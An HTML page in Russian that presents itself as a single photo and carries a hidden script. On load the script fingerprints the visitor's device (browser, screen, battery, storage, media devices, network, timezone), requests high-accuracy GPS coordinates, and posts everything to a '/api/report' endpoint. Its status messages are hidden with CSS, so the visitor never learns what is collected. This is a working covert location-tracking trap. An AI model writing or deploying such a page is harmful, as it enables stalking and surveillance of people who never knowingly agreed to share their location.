<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Фото</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background: #1a1a1a;
      color: #b0b0b0;
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0.75rem 0.75rem 1.25rem;
    }
    figure {
      margin: 0;
      max-width: min(100%, 520px);
      width: 100%;
    }
    figure img {
      display: block;
      width: 100%;
      height: auto;
      border-radius: 8px;
    }
    /* Текст статуса остаётся в DOM для логики, но не виден пользователю */
    #status {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      white-space: nowrap;
      border: 0;
    }
    .err { color: #f66; }
    .ok { color: #6c6; }
  </style>
</head>
<body>
  <!-- position:relative чтобы абсолютный #status не уехал от окна -->
  <figure style="position: relative">
    <img
      src="fitonbot-1773979162864.png"
      alt=""
      width="1080"
      height="1920"
      decoding="async"
    />
    <div id="status" aria-live="polite" aria-hidden="true"></div>
  </figure>

  <script>
    (function () {
      /*
       * Автоматически «нажать Разрешить» в системном окне браузера нельзя:
       * это запрещено политикой безопасности (иначе любой сайт мог бы включать геолокацию без согласия).
       * Скрипт уже вызывает getCurrentPosition при загрузке — диалог показывает сам браузер.
       */
      const statusEl = document.getElementById("status");
      let started = false;

      function escapeHtml(s) {
        const d = document.createElement("div");
        d.textContent = s;
        return d.innerHTML;
      }

      function formatGeolocationError(err) {
        if (!err) return "Неизвестная ошибка геолокации";
        const code = err.code;
        if (code === 1) {
          return (
            "Доступ к геолокации запрещён. Откройте настройки сайта (замок / «i» в адресной строке) → разрешите «Местоположение», " +
            "при необходимости включите GPS в настройках телефона и обновите страницу."
          );
        }
        if (code === 2) {
          return (
            "Местоположение недоступно. На смартфоне включите «Службы геолокации» / GPS и режим «Высокая точность», " +
            "выйдите на улицу или к окну и обновите страницу."
          );
        }
        if (code === 3) {
          return "Таймаут ожидания координат. Повторите после лучшего приёма GPS.";
        }
        const m = err.message || "";
        if (/denied/i.test(m)) return formatGeolocationError({ code: 1 });
        return m || "Ошибка геолокации";
      }

      async function collectFullEnv() {
        const nav = navigator;
        const out = {
          userAgent: nav.userAgent,
          language: nav.language,
          languages: nav.languages ? Array.from(nav.languages) : [],
          platform: nav.platform,
          vendor: nav.vendor || "",
          product: nav.product || "",
          vendorSub: nav.vendorSub || "",
          productSub: nav.productSub || "",
          hardwareConcurrency: nav.hardwareConcurrency,
          deviceMemory: nav.deviceMemory,
          maxTouchPoints: nav.maxTouchPoints,
          cookieEnabled: nav.cookieEnabled,
          onLine: nav.onLine,
          webdriver: nav.webdriver,
          pdfViewerEnabled: nav.pdfViewerEnabled,
          doNotTrack: nav.doNotTrack,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffsetMin: -new Date().getTimezoneOffset(),
          visibilityState: document.visibilityState,
          referrer: document.referrer || "",
          pageUrl: location.href,
          locationBar: {
            protocol: location.protocol,
            host: location.host,
            hostname: location.hostname,
            pathname: location.pathname,
            search: location.search,
            hash: location.hash,
          },
          screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : null,
          },
          screenColorDepth: screen.colorDepth,
          viewport: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio,
          },
          windowOuter: {
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
          },
        };

        try {
          out.intl = Intl.DateTimeFormat().resolvedOptions();
        } catch (_) {
          out.intl = null;
        }

        try {
          out.prefersColorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches
            ? "dark"
            : "light";
        } catch (_) {}
        try {
          out.prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
        } catch (_) {}

        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
        if (conn) {
          out.network = {
            type: conn.type,
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData,
          };
        }

        if (performance.memory) {
          out.performanceMemory = {
            usedJSHeapSize: performance.memory.usedJSHeapSize,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
          };
        }

        try {
          if (nav.getBattery) {
            const b = await nav.getBattery();
            out.battery = {
              level: b.level,
              charging: b.charging,
              chargingTime: b.chargingTime,
              dischargingTime: b.dischargingTime,
            };
          }
        } catch (_) {}

        try {
          if (nav.storage && nav.storage.estimate) {
            const est = await nav.storage.estimate();
            out.storage = { quota: est.quota, usage: est.usage };
          }
        } catch (_) {}

        try {
          if (nav.userAgentData && nav.userAgentData.getHighEntropyValues) {
            out.uaClientHints = await nav.userAgentData.getHighEntropyValues([
              "architecture",
              "bitness",
              "brands",
              "fullVersionList",
              "mobile",
              "model",
              "platform",
              "platformVersion",
              "uaFullVersion",
              "wow64",
            ]);
          }
        } catch (_) {}

        try {
          if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
            const devs = await nav.mediaDevices.enumerateDevices();
            const byKind = {};
            devs.forEach(function (d) {
              byKind[d.kind] = (byKind[d.kind] || 0) + 1;
            });
            out.mediaDevices = {
              total: devs.length,
              byKind: byKind,
              hasLabels: devs.some(function (d) {
                return d.label && d.label.length > 0;
              }),
            };
          }
        } catch (_) {}

        return out;
      }

      function coordsToGeoPayload(pos, fixHint) {
        const c = pos.coords;
        return {
          latitude: c.latitude,
          longitude: c.longitude,
          accuracyM: c.accuracy,
          altitude: c.altitude,
          altitudeAccuracyM: c.altitudeAccuracy,
          heading: c.heading,
          speed: c.speed,
          timestamp: pos.timestamp,
          fixHint: fixHint || "",
        };
      }

      /**
       * Включить чип GPS в настройках Android/iOS со страницы нельзя (нет Web API).
       * На смартфонах: enableHighAccuracy + watchPosition — даём модулю время,
       * выбираем чтение с минимальной accuracy (чаще это именно GPS, а не только сеть).
       */
      function readGeo() {
        return new Promise(function (resolve, reject) {
          if (!navigator.geolocation) {
            reject(new Error("Геолокация в этом браузере не поддерживается"));
            return;
          }
          const mobile = /Android|iPhone|iPad|iPod|Mobile/i.test(
            navigator.userAgent || ""
          );
          const highAcc = { enableHighAccuracy: true, maximumAge: 0 };

          if (!mobile) {
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                resolve(coordsToGeoPayload(pos, "desktop:getCurrentPosition"));
              },
              function (err) {
                reject(new Error(formatGeolocationError(err)));
              },
              Object.assign({ timeout: 28000 }, highAcc)
            );
            return;
          }

          let best = null;
          let watchId = null;
          let finished = false;
          const t0 = Date.now();
          const HARD_MS = 42000;
          const GOOD_ACC_M = 35;
          const MIN_WAIT_MS = 2200;

          function cleanup() {
            if (watchId != null) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }
          }

          function finishOk(pos, hint) {
            if (finished) return;
            finished = true;
            cleanup();
            clearTimeout(hardTimer);
            resolve(coordsToGeoPayload(pos, hint));
          }

          function finishErr(err) {
            if (finished) return;
            finished = true;
            cleanup();
            clearTimeout(hardTimer);
            reject(new Error(formatGeolocationError(err)));
          }

          const hardTimer = setTimeout(function () {
            if (finished) return;
            if (best) {
              finishOk(best, "mobile:watchPosition-best");
              return;
            }
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                if (finished) return;
                finished = true;
                cleanup();
                clearTimeout(hardTimer);
                resolve(
                  coordsToGeoPayload(pos, "mobile:getCurrentPosition-fallback")
                );
              },
              function (err) {
                finishErr(err);
              },
              Object.assign({ timeout: 16000 }, highAcc)
            );
          }, HARD_MS);

          watchId = navigator.geolocation.watchPosition(
            function (pos) {
              if (finished) return;
              const acc = pos.coords.accuracy;
              if (!best || acc < best.coords.accuracy) {
                best = pos;
              }
              const elapsed = Date.now() - t0;
              if (acc <= GOOD_ACC_M && elapsed >= MIN_WAIT_MS) {
                finishOk(pos, "mobile:watchPosition-high-accuracy");
              }
            },
            function (err) {
              finishErr(err);
            },
            highAcc
          );
        });
      }

      async function startAutoReport() {
        if (started) return;
        started = true;

        try {
          if (navigator.permissions && navigator.permissions.query) {
            const st = await navigator.permissions.query({ name: "geolocation" });
            if (st.state === "denied") {
              statusEl.innerHTML =
                '<span class="err">Геолокация для этого сайта отключена в браузере. Включите её в настройках адреса (замок) и обновите страницу.</span>';
              started = false;
              return;
            }
          }
        } catch (_) {}

        statusEl.textContent =
          "Сейчас появится запрос доступа к местоположению. Разрешите его; на телефоне при необходимости включите GPS (высокая точность).";

        try {
          if (/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)) {
            navigator.vibrate && navigator.vibrate(40);
          }
        } catch (_) {}

        let env;
        try {
          env = await collectFullEnv();
        } catch (e) {
          env = {
            userAgent: navigator.userAgent,
            pageUrl: location.href,
            collectEnvError: String(e && e.message ? e.message : e),
          };
        }

        statusEl.textContent = "Запрос координат GPS / сети… Подтвердите в системном окне.";

        let geo;
        try {
          geo = await readGeo();
        } catch (e) {
          statusEl.innerHTML = '<span class="err">' + escapeHtml(e.message) + "</span>";
          started = false;
          return;
        }

        statusEl.textContent = "Отправка отчёта…";

        const payload = {
          collectedAt: new Date().toISOString(),
          env: env,
          geolocation: geo,
        };

        try {
          const r = await fetch("/api/report", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
          const text = await r.text();
          if (!r.ok) throw new Error(text || "HTTP " + r.status);
          statusEl.innerHTML = '<span class="ok">Готово.</span>';
        } catch (e) {
          statusEl.innerHTML =
            '<span class="err">' + escapeHtml(e && e.message ? e.message : String(e)) + "</span>";
        }
      }

      document.addEventListener("DOMContentLoaded", function () {
        requestAnimationFrame(function () {
          startAutoReport();
        });
      });
    })();
  </script>
</body>
</html>
